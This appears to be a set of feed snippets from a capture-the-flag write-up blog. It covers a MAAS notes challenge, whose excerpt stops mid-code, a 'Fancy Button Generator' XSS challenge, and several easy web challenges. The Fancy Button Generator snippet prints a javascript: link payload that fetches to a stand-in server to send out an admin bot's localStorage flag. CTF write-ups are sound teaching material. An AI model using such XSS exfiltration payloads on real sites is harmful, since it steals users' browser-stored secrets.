      <description>MAAS 2 // Notes Source was the same from MAAS 1 (and will be the same for MAAS 3). MAAS 2 involved the &amp;lsquo;notes&amp;rsquo; part of MAAS, where you are prompted to register a user and afterwards add key:val attributes to yourself, give yourself a bio, or transfer key:value attributes to another user.
The provided source has some interesting code:
notes/app.py
@app.route(&amp;#39;/useraction&amp;#39;, methods=[&amp;#34;POST&amp;#34;]) def useraction(): mode = request.form.get(&amp;#34;mode&amp;#34;) username = request.</description>

      <description>Fancy Button Generator // FBG A simple xss challenge with the slightest of twists: instead of stealing admin cookies, you&amp;rsquo;re stealing admin&amp;rsquo;s localstorage values. This was possible because the admin, which was a puppetteer chrome browser, was operating in no-sandbox mode.
Insert as your payload:
title: eh link: javascript:fetch(&#39;your.server?fleg=&#39;%2B(window.localStorage.getItem(&amp;quot;flag&amp;quot;))); And report to admin. Careful with the wait times&amp;hellip;
NOTE: I first-blooded this challenge before certain measures were implemented. There were some issues with FBG throughout the competition that involved the organizers making amendments and introducing a pow to help with the stability of the infrastructure.</description>

      <description>Lightning Round The first few web challenges were pretty trivial so I&amp;rsquo;ll do super quick, 2-sentence descriptions on how to solve them.
Source it! Inspect source. You&amp;rsquo;ll find it.
Oinker Make an oink with the exact same content and realize that each oink has an allocated place in the webpage&amp;rsquo;s directory. (Example - inputting alert(1); leads to oink endpoint 64). Go to \oink\2 to get the flag.
Fastfox (easy way) Intended (hard) solution was escalating a JIT bug, which I will definitely research more of so expect part 2 ;) but the easy way was determining what functions were available in the scope of Bob&amp;rsquo;s jsshell.</description>
